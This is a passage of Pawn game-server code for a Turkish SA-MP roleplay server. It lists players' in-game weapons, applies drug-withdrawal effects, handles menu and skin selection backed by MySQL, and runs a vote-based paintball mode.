			        case 16: silahisim1 = "El Bombasý (( /bomba ))";
			        case 17: silahisim1 = "Sis Bombasý (( /flash ))";
			        case 18: silahisim1 = "Molotof (( /molotof ))";
			        case 22: silahisim1 = "Pistol (( /pistol ))";
			        case 23: silahisim1 = "Susturuculu Pistol (( /spistol ))";
			        case 24: silahisim1 = "Desert Eagle (( /deagle ))";
			        case 25: silahisim1 = "Shotgun (( /shotgun ))";
			        case 26: silahisim1 = "Sawn-off Shotgun (( /sawnoff ))";
			        case 27: silahisim1 = "Combat Shotgun (( /combatgun ))";
			        case 28: silahisim1 = "Micro SMG (( /uzi ))";
			        case 29: silahisim1 = "Mp5 (( /mp5 ))";
			        case 30: silahisim1 = "AK47 (( /ak47 ))";
			        case 31: silahisim1 = "M4 (( /m4 ))";
			        case 32: silahisim1 = "Tec9 (( /tec9 ))";
			        case 33: silahisim1 = "Country Rifle (( /crifle ))";
			        case 34: silahisim1 = "Sniper Rifle (( /sniper ))";
			        case 35: silahisim1 = "Rocket Launcher (( /rpg ))";
			        case 36: silahisim1 = "HS Rocket Launcher (( /hsrpg ))";
			        case 37: silahisim1 = "Flamethrower (( /fthrower ))";
			        case 38: silahisim1 = "Minigun (( /minigun ))";
			        case 39: silahisim1 = "Satchel Charge (( /scharge ))";
			        case 41: silahisim1 = "Spraycan (( /spray ))";
			        case 42: silahisim1 = "Yangýn Söndürücü Tüp (( /ysontup ))";
			        case 43: silahisim1 = "Kamera (( /kamera ))";
			        case 46: silahisim1 = "Paraþüt (( /parasut ))";
				}
				_rtext = "Yok";
				if(OyuncuSilah[i][ruhsat]) _rtext = "Var";
		        format(mstring, sizeof(mstring), "%s%d\t%s\t%d\t%s\n",mstring,OyuncuSilah[i][no],silahisim1,OyuncuSilah[i][mermi],_rtext);
			}
	    }
	    format(mstring, sizeof(mstring), "NO\tSilah\tMermi\tRuhsat\n%s",mstring);
	    ShowPlayerDialog(playerid,90,DIALOG_STYLE_TABLIST_HEADERS,string, mstring, "Tamam", "Ýptal");
	}
	else
	{
		Hata(playerid, "Hatalý ID girdiniz.");
	}
}
forward ShowGunsTum(playerid, targetid);
public ShowGunsTum(playerid, targetid)
{
	if(IsPlayerConnected(targetid))
	{
	    new string[128];
	    format(string, sizeof(string), ""C7"EIGHTBORN - "C8"Silah[%s]", OyuncuAdiniBul(targetid));
	    new mstring[512],_rtext[16];
	    new silahisim1[60];
	    foreach(new i : Guns)
		{
			if(OyuncuSilah[i][oyuncuid] == Karakter[targetid][sqlid])
			{
			    if(OyuncuSilah[i][durum] == 4) continue;
			    switch(OyuncuSilah[i][silahid])
				{
					case 0: silahisim1 = "Boþ";
			        case 1: silahisim1 = "Muþta (( /musta ))";
			        case 2: silahisim1 = "Golf Sopasý (( /golfsopasi ))";
			        case 3: silahisim1 = "Cop  (( /cop ))";
			        case 4: silahisim1 = "Býçak (( /bicak ))";
			        case 5: silahisim1 = "Beyzbol Sopasý (( /sopa ))";
			        case 6: silahisim1 = "Kürek (( /kurek ))";
			        case 7: silahisim1 = "Bilardo Sopasý (( /bsopasi ))";
			        case 8: silahisim1 = "Katana  (( /katana ))";
			        case 9: silahisim1 = "Testere (( /testere ))";
			        case 10: silahisim1 = "Mor Dildo (( /mdildo ))";
			        case 11: silahisim1 = "Küçük Beyaz Vibrator (( /kbvibra ))";
			        case 12: silahisim1 = "Büyük Beyaz Vibrator (( /bbvibra ))";
			        case 13: silahisim1 = "Gümüþ Vibrator (( /gumvibra ))";
			        case 14: silahisim1 = "Çiçek Demeti (( /cicek ))";
			        case 15: silahisim1 = "Baston (( /baston ))";
			        case 16: silahisim1 = "El Bombasý (( /bomba ))";
			        case 17: silahisim1 = "Sis Bombasý (( /flash ))";
			        case 18: silahisim1 = "Molotof (( /molotof ))";
			        case 22: silahisim1 = "Pistol (( /pistol ))";
			        case 23: silahisim1 = "Susturuculu Pistol (( /spistol ))";
			        case 24: silahisim1 = "Desert Eagle (( /deagle ))";
			        case 25: silahisim1 = "Shotgun (( /shotgun ))";
			        case 26: silahisim1 = "Sawn-off Shotgun (( /sawnoff ))";
			        case 27: silahisim1 = "Combat Shotgun (( /combatgun ))";
			        case 28: silahisim1 = "Micro SMG (( /uzi ))";
			        case 29: silahisim1 = "Mp5 (( /mp5 ))";
			        case 30: silahisim1 = "AK47 (( /ak47 ))";
			        case 31: silahisim1 = "M4 (( /m4 ))";
			        case 32: silahisim1 = "Tec9 (( /tec9 ))";
			        case 33: silahisim1 = "Country Rifle (( /crifle ))";
			        case 34: silahisim1 = "Sniper Rifle (( /sniper ))";
			        case 35: silahisim1 = "Rocket Launcher (( /rpg ))";
			        case 36: silahisim1 = "HS Rocket Launcher (( /hsrpg ))";
			        case 37: silahisim1 = "Flamethrower (( /fthrower ))";
			        case 38: silahisim1 = "Minigun (( /minigun ))";
			        case 39: silahisim1 = "Satchel Charge (( /scharge ))";
			        case 41: silahisim1 = "Spraycan (( /spray ))";
			        case 42: silahisim1 = "Yangýn Söndürücü Tüp (( /ysontup ))";
			        case 43: silahisim1 = "Kamera (( /kamera ))";
			        case 46: silahisim1 = "Paraþüt (( /parasut ))";
				}
				switch(OyuncuSilah[i][durum])
				{
				    case 1: _rtext = "Üzerinde";
				    case 2: _rtext = "Yerde";
				    case 3: _rtext = "Araçta";
				    //case 4: _rtext = "Silinmiþ";
					case 5: _rtext = "El Konulmuþ";
				}
		        format(mstring, sizeof(mstring), "%s%d\t%s\t%d\t%s\n",mstring,OyuncuSilah[i][no],silahisim1,OyuncuSilah[i][mermi],_rtext);
			}
	    }
	    format(mstring, sizeof(mstring), "NO\tSilah\tMermi\tDurum\n%s",mstring);
	    ShowPlayerDialog(playerid,90,DIALOG_STYLE_TABLIST_HEADERS,string, mstring, "Tamam", "Ýptal");
	}
	else
	{
		Hata(playerid, "Hatalý ID girdiniz.");
	}
}
forward ShowGunsEx(playerid, targetid);
public ShowGunsEx(playerid, targetid)
{
	if(IsPlayerConnected(targetid))
	{
	    new string[128];
	    format(string, sizeof(string), ""C7"EIGHTBORN - "C8"Silah[%s]", OyuncuAdiniBul(targetid));
	    new mstring[512],_rtext[5];
	    new silahisim1[60];
	    foreach(new i : Guns)
		{
			if(OyuncuSilah[i][oyuncuid] == Karakter[targetid][sqlid])
			{
			    if(OyuncuSilah[i][durum] != 1) continue;
			    switch(OyuncuSilah[i][silahid])
				{
					case 0: silahisim1 = "Boþ";
			        case 1: silahisim1 = "Muþta (( /musta ))";
			        case 2: silahisim1 = "Golf Sopasý (( /golfsopasi ))";
			        case 3: silahisim1 = "Cop  (( /cop ))";
			        case 4: silahisim1 = "Býçak (( /bicak ))";
			        case 5: silahisim1 = "Beyzbol Sopasý (( /sopa ))";
			        case 6: silahisim1 = "Kürek (( /kurek ))";
			        case 7: silahisim1 = "Bilardo Sopasý (( /bsopasi ))";
			        case 8: silahisim1 = "Katana  (( /katana ))";
			        case 9: silahisim1 = "Testere (( /testere ))";
			        case 10: silahisim1 = "Mor Dildo (( /mdildo ))";
			        case 11: silahisim1 = "Küçük Beyaz Vibrator (( /kbvibra ))";
			        case 12: silahisim1 = "Büyük Beyaz Vibrator (( /bbvibra ))";
			        case 13: silahisim1 = "Gümüþ Vibrator (( /gumvibra ))";
			        case 14: silahisim1 = "Çiçek Demeti (( /cicek ))";
			        case 15: silahisim1 = "Baston (( /baston ))";
			        case 16: silahisim1 = "El Bombasý (( /bomba ))";
			        case 17: silahisim1 = "Sis Bombasý (( /flash ))";
			        case 18: silahisim1 = "Molotof (( /molotof ))";
			        case 22: silahisim1 = "Pistol (( /pistol ))";
			        case 23: silahisim1 = "Susturuculu Pistol (( /spistol ))";
			        case 24: silahisim1 = "Desert Eagle (( /deagle ))";
			        case 25: silahisim1 = "Shotgun (( /shotgun ))";
			        case 26: silahisim1 = "Sawn-off Shotgun (( /sawnoff ))";
			        case 27: silahisim1 = "Combat Shotgun (( /combatgun ))";
			        case 28: silahisim1 = "Micro SMG (( /uzi ))";
			        case 29: silahisim1 = "Mp5 (( /mp5 ))";
			        case 30: silahisim1 = "AK47 (( /ak47 ))";
			        case 31: silahisim1 = "M4 (( /m4 ))";
			        case 32: silahisim1 = "Tec9 (( /tec9 ))";
			        case 33: silahisim1 = "Country Rifle (( /crifle ))";
			        case 34: silahisim1 = "Sniper Rifle (( /sniper ))";
			        case 35: silahisim1 = "Rocket Launcher (( /rpg ))";
			        case 36: silahisim1 = "HS Rocket Launcher (( /hsrpg ))";
			        case 37: silahisim1 = "Flamethrower (( /fthrower ))";
			        case 38: silahisim1 = "Minigun (( /minigun ))";
			        case 39: silahisim1 = "Satchel Charge (( /scharge ))";
			        case 41: silahisim1 = "Spraycan (( /spray ))";
			        case 42: silahisim1 = "Yangýn Söndürücü Tüp (( /ysontup ))";
			        case 43: silahisim1 = "Kamera (( /kamera ))";
			        case 46: silahisim1 = "Paraþüt (( /parasut ))";
				}
				_rtext = "Yok";
				if(OyuncuSilah[i][ruhsat]) _rtext = "Var";
		        format(mstring, sizeof(mstring), "%s%d\t%s\t%d\t%s\n",mstring,OyuncuSilah[i][no],silahisim1,OyuncuSilah[i][mermi],_rtext);
			}
	    }
	    format(mstring, sizeof(mstring), "NO\tSilah\tMermi\tRuhsat\n%s",mstring);
	    ShowPlayerDialog(playerid,325,DIALOG_STYLE_TABLIST_HEADERS,string, mstring, "Tamam", "Ýptal");
	}
	else
	{
		Hata(playerid, "Hatalý ID girdiniz.");
	}
}
forward ShowGunsElkoy(playerid, targetid);
public ShowGunsElkoy(playerid, targetid)
{
	if(IsPlayerConnected(targetid))
	{
	    new string[128];
	    format(string, sizeof(string), ""C7"EIGHTBORN - "C8"Silah[%s]", OyuncuAdiniBul(targetid));
	    new mstring[512],_rtext[5];
	    new silahisim1[60];
	    foreach(new i : Guns)
		{
			if(OyuncuSilah[i][oyuncuid] == Karakter[targetid][sqlid])
			{
			    if(OyuncuSilah[i][durum] != 1) continue;
			    switch(OyuncuSilah[i][silahid])
				{
					case 0: silahisim1 = "Boþ";
			        case 1: silahisim1 = "Muþta (( /musta ))";
			        case 2: silahisim1 = "Golf Sopasý (( /golfsopasi ))";
			        case 3: silahisim1 = "Cop  (( /cop ))";
			        case 4: silahisim1 = "Býçak (( /bicak ))";
			        case 5: silahisim1 = "Beyzbol Sopasý (( /sopa ))";
			        case 6: silahisim1 = "Kürek (( /kurek ))";
			        case 7: silahisim1 = "Bilardo Sopasý (( /bsopasi ))";
			        case 8: silahisim1 = "Katana  (( /katana ))";
			        case 9: silahisim1 = "Testere (( /testere ))";
			        case 10: silahisim1 = "Mor Dildo (( /mdildo ))";
			        case 11: silahisim1 = "Küçük Beyaz Vibrator (( /kbvibra ))";
			        case 12: silahisim1 = "Büyük Beyaz Vibrator (( /bbvibra ))";
			        case 13: silahisim1 = "Gümüþ Vibrator (( /gumvibra ))";
			        case 14: silahisim1 = "Çiçek Demeti (( /cicek ))";
			        case 15: silahisim1 = "Baston (( /baston ))";
			        case 16: silahisim1 = "El Bombasý (( /bomba ))";
			        case 17: silahisim1 = "Sis Bombasý (( /flash ))";
			        case 18: silahisim1 = "Molotof (( /molotof ))";
			        case 22: silahisim1 = "Pistol (( /pistol ))";
			        case 23: silahisim1 = "Susturuculu Pistol (( /spistol ))";
			        case 24: silahisim1 = "Desert Eagle (( /deagle ))";
			        case 25: silahisim1 = "Shotgun (( /shotgun ))";
			        case 26: silahisim1 = "Sawn-off Shotgun (( /sawnoff ))";
			        case 27: silahisim1 = "Combat Shotgun (( /combatgun ))";
			        case 28: silahisim1 = "Micro SMG (( /uzi ))";
			        case 29: silahisim1 = "Mp5 (( /mp5 ))";
			        case 30: silahisim1 = "AK47 (( /ak47 ))";
			        case 31: silahisim1 = "M4 (( /m4 ))";
			        case 32: silahisim1 = "Tec9 (( /tec9 ))";
			        case 33: silahisim1 = "Country Rifle (( /crifle ))";
			        case 34: silahisim1 = "Sniper Rifle (( /sniper ))";
			        case 35: silahisim1 = "Rocket Launcher (( /rpg ))";
			        case 36: silahisim1 = "HS Rocket Launcher (( /hsrpg ))";
			        case 37: silahisim1 = "Flamethrower (( /fthrower ))";
			        case 38: silahisim1 = "Minigun (( /minigun ))";
			        case 39: silahisim1 = "Satchel Charge (( /scharge ))";
			        case 41: silahisim1 = "Spraycan (( /spray ))";
			        case 42: silahisim1 = "Yangýn Söndürücü Tüp (( /ysontup ))";
			        case 43: silahisim1 = "Kamera (( /kamera ))";
			        case 46: silahisim1 = "Paraþüt (( /parasut ))";
				}
				_rtext = "Yok";
				if(OyuncuSilah[i][ruhsat]) _rtext = "Var";
		        format(mstring, sizeof(mstring), "%s%d\t%s\t%d\t%s\n",mstring,OyuncuSilah[i][no],silahisim1,OyuncuSilah[i][mermi],_rtext);
			}
	    }
	    SetPVarInt(playerid, "polisElkoy", targetid);
	    format(mstring, sizeof(mstring), "NO\tSilah\tMermi\tRuhsat\n%s",mstring);
	    ShowPlayerDialog(playerid,422,DIALOG_STYLE_TABLIST_HEADERS,string, mstring, "Tamam", "Ýptal");
	}
	else
	{
		Hata(playerid, "Hatalý ID girdiniz.");
	}
}
forward CheckCrisis(playerid, crisis);
public CheckCrisis(playerid, crisis)
{
	new rand = random(sizeof(marijuanahava));
	if(crisis == 1)
	{
		SetPlayerWeather(playerid,marijuanahava[rand][0]);
		SetPlayerDrunkLevel(playerid,2000+(300*26));
		Bilgi(playerid, "Uyuþturucu krizine girmek üzeresiniz.");
		Karakter[playerid][krizgeldimi] = 1;
	}
	else if(crisis == 2)
	{
		SetPlayerWeather(playerid,marijuanahava[rand][0]);
		SetPlayerDrunkLevel(playerid,2000+(300*26));
		Karakter[playerid][krizgeldimi] = 1;
		Bilgi(playerid, "Uyuþturucu krizine girmenize az kaldý. Tedavi olmalý veya uyuþturucu kullanmalýsýnýz.");
	}
	else if(crisis == 3)
	{
		SetPlayerWeather(playerid,marijuanahava[rand][0]);
		SetPlayerDrunkLevel(playerid,2000+(300*26));
		ApplyAnimationEx(playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0);
		Karakter[playerid][krizgeldimi] = 1;
		Bilgi(playerid, "Uyuþturucu krizine girdiniz.");
	}
}
forward Silah(playerid, _silahid);
public Silah(playerid, _silahid)
{
	new SilahElinde[MAX_PLAYERS];
	new ammo;
	for (new i = 0; i < 13; i++)
	{
  		GetPlayerWeaponData(playerid, i, weapons2[i][0], weapons2[i][1]);
  		if(weapons2[i][0] == _silahid)
  		{
  		    SilahElinde[playerid] = 1;
  		    ammo = weapons2[i][1];
		}
	}
	if(!SilahElinde[playerid]) return Hata(playerid, "Silah elinizde deðil.");
	OyuncuSilah[SilahKullaniyor[playerid]][mermi] = ammo;
	RemovePlayerWeapon(playerid, _silahid);
	SilahKullaniyor[playerid] = 0;
	OyuncuSilahKaydetEx(SilahKullaniyor[playerid]);
	return 1;
}
forward RemovePlayerWeapon(playerid, weaponid);
public RemovePlayerWeapon(playerid, weaponid)
{
	new plyweapons2[12] = 0;
	new plyAmmo[12] = 0;
	for(new slot = 0; slot != 12; slot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, slot, wep, ammo);

		if(wep != weaponid && ammo != 0)
		{
			GetPlayerWeaponData(playerid, slot, plyweapons2[slot], plyAmmo[slot]);
		}
	}
	ResetPlayerWeapons(playerid);
	for(new slot = 0; slot != 12; slot++)
	{
	    if(plyAmmo[slot] != 0)
	    {
	        SilahKullaniyor[playerid] = 1;
			GivePlayerWeaponEx(playerid, plyweapons2[slot], plyAmmo[slot]);
		}
	}
	return 1;
}

static bool:OyuncuSilahlari[MAX_PLAYERS][47];

forward GivePlayerWeaponEx(playerid,weaponid,ammo);
public GivePlayerWeaponEx(playerid,weaponid,ammo)
{
    OyuncuSilahlari[playerid][weaponid] = true;
    return GivePlayerWeapon(playerid,weaponid,ammo);
}
public OnPlayerModelSelectionEx(playerid, response, extraid, modelid)
{
	if(Debug) printf("OnPlayerModelSelectionEx(%d, %d, %d, %d)",playerid, response, extraid, modelid);
 	if(extraid == MENU_MODEL)
	{
	    if(response)
	    {
	        SetPVarInt(playerid, "MenuModel", modelid);
	        IsyeriMenuEkle(playerid);
	    }
	    else return IsyeriMenuEkle(playerid);
	    return 1;
	}
	if(extraid == MENU_MODEL2)
	{
	    if(response)
	    {
	        new mesafe = GetPVarInt(playerid, "MenuIsyeriID");
	        new midx = GetPVarInt(playerid, "MenuIsyeriMID");
	        new listitemx = GetPVarInt(playerid, "MenuDuzenleID");
	        new mstring[248],query[128],rows,fields,_ttip[12],__ad[32];
			format(query, sizeof(query), "UPDATE `isyerimenu` SET `model` = '%d' WHERE `mid` = '%d'",modelid,midx);
			mysql_tquery(1,query);
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
			new Cache:cache = mysql_query(query,true);
            cache_get_data(rows, fields, g_iHandle);
           	cache_get_field_content(listitemx, "isim", __ad);
            if(cache_get_field_content_int(listitemx, "tip") == 1) _ttip = "Yiyecek";
            else if(cache_get_field_content_int(listitemx, "tip") == 2) _ttip = "Ýçecek";
			format(mstring, sizeof(mstring), "Tip\t\t "C2"%s\nÝsim\t\t "C2"%s\nFiyat\t\t "C2"%d\nModel\t\t "C2"%d\n"C2"Menü Sil",
				_ttip,
				__ad,
				cache_get_field_content_int(listitemx, "fiyat"),
                modelid);
            cache_delete(cache);
            ShowPlayerDialog(playerid, 370, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Menüsü", mstring, "Düzenle", "Geri");
            IsyeriKaydet(mesafe);
	    }
	    return 1;
	}
	if(extraid == MENU_SKIN_SEC1) {
		if(response) {
		    new _id;
			for(new i=0;i<sizeof(GunSkins);i++) {
				if(GunSkins[i][0] == modelid) {
					_id = i;
					break;
				}
			}
			new _model[sizeof(GunSkins[])-1];
			for(new i=1;i<sizeof(GunSkins[]);i++) {
			    if(GunSkins[_id][i] != 0)
					_model[i] = GunSkins[_id][i];
			}
			ShowModelSelectionMenuEx(playerid, _model, sizeof(_model), ""C7"EIGHTBORN - "C8"Skin Seç", MENU_SKIN_SEC2, 16.0, 0.0, -55.0);
		}
		return 1;
	}
	if(extraid == MENU_SKIN_SEC2) {
		if(response) {
			if(Karakter[playerid][SilahSkin][GetPVarInt(playerid, "SilahSkinSec")] == modelid) return Hata(playerid, "Zaten bu skini kullanýyorsunuz.");
			if(modelid < 0 && !SQLCheckSkin(Karakter[playerid][sqlid], GetGunSQLName(modelid))) return Hata(playerid, "Bu skine sahip deðilsiniz.");
			new mstring[256];
			format(mstring, sizeof(mstring), "%s isimli silahýnýzýn skinini %s olarak deðiþtirdiniz.", GetGunName(GetPVarInt(playerid, "SilahSkinSec")), GetGunSkinName(modelid));
			Bilgi(playerid, mstring);
			Karakter[playerid][SilahSkin][GetPVarInt(playerid, "SilahSkinSec")] = modelid;
		    mysql_format(1,mstring, sizeof(mstring), "UPDATE `karakterler` SET `skin%d` = '%d' WHERE `id` = '%d'",
			GetPVarInt(playerid, "SilahSkinSec"),
			modelid,
			Karakter[playerid][sqlid]);
			mysql_tquery(1,mstring);
		}
		return 1;
	}
	return 1;
}
forward PaintBallStarting(playerid);
public PaintBallStarting(playerid)
{
	new string[128];
	format(string,sizeof(string),"{E84D4D}[Paintball]{FFFFFF} Paintball maçý 30 saniye içerisinde baþlýyor. Oyuncu sayýsý: %d",PBPlayers);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	SetTimer("PaintBallStart",30000,false);
}
forward PaintBallStart();
public PaintBallStart()
{
	PBStarted = true;
	for(new i;i<MAX_PLAYERS;i++)
	{
	    if(PlayerPBing[i])
		{
		    SendClientMessage(i,COLOR_LIGHTBLUE,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý!");
			if(DeagleVote > ShotgunVote && DeagleVote > M4Vote && DeagleVote > Mp5Vote && DeagleVote > SnipeVote )
			{
			    ResetPlayerWeapons(i);
			    GivePlayerWeapon(i,24,99999);
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Desert Eagle");
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
			    COZ(i);
			    PBGunID = 24;
			    SetTimer("PaintBallEnd",300000,false);
			}
			else if(ShotgunVote > DeagleVote && ShotgunVote > M4Vote && ShotgunVote > Mp5Vote && ShotgunVote > SnipeVote )
			{
				ResetPlayerWeapons(i);
			    GivePlayerWeapon(i,25,99999);
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Shotgun");
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
			    COZ(i);
			    PBGunID = 25;
			    SetTimer("PaintBallEnd",300000,false);
			}
			else if(M4Vote > DeagleVote && M4Vote > ShotgunVote && M4Vote > Mp5Vote && M4Vote > SnipeVote )
			{
				ResetPlayerWeapons(i);
			    GivePlayerWeapon(i,31,99999);
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: M4");
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
			    COZ(i);
			    PBGunID = 31;
			    SetTimer("PaintBallEnd",300000,false);
			}
			else if(Mp5Vote > DeagleVote && Mp5Vote > ShotgunVote && Mp5Vote > M4Vote && Mp5Vote > SnipeVote )
			{
				ResetPlayerWeapons(i);
			    GivePlayerWeapon(i,29,99999);
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: MP5");
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
			    COZ(i);
			    PBGunID = 29;
			    SetTimer("PaintBallEnd",300000,false);
			}
			else if(SnipeVote > DeagleVote && SnipeVote > ShotgunVote && SnipeVote > M4Vote && SnipeVote > M4Vote )
			{
				ResetPlayerWeapons(i);
			    GivePlayerWeapon(i,34,99999);
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Sniper");
			    SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
			    COZ(i);
			    PBGunID = 34;
			    SetTimer("PaintBallEnd",300000,false);
			}
			else if(SnipeVote == DeagleVote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,24,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Desert Eagle");
				        PBGunID = 24;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,34,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Sniper");
				        PBGunID = 34;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(SnipeVote == Mp5Vote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,29,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: MP5");
				        PBGunID = 29;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,34,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Sniper");
				        PBGunID = 34;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(SnipeVote == M4Vote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,31,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: M4");
				        PBGunID = 31;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,34,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Sniper");
				        PBGunID = 34;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(SnipeVote == ShotgunVote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,25,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Shotgun");
				        PBGunID = 25;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,34,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Sniper");
				        PBGunID = 34;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(M4Vote == ShotgunVote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,25,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Shotgun");
				        PBGunID = 25;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,31,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: M4");
				        PBGunID = 31;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(Mp5Vote == ShotgunVote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,25,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Shotgun");
				        PBGunID = 25;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,29,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: MP5");
				        PBGunID = 29;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(DeagleVote == ShotgunVote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,25,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Shotgun");
				        PBGunID = 25;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,24,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Deagle");
				        PBGunID = 24;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(DeagleVote == Mp5Vote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,29,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: MP5");
				        PBGunID = 29;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,24,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Deagle");
				        PBGunID = 24;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(DeagleVote == M4Vote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,31,99999);
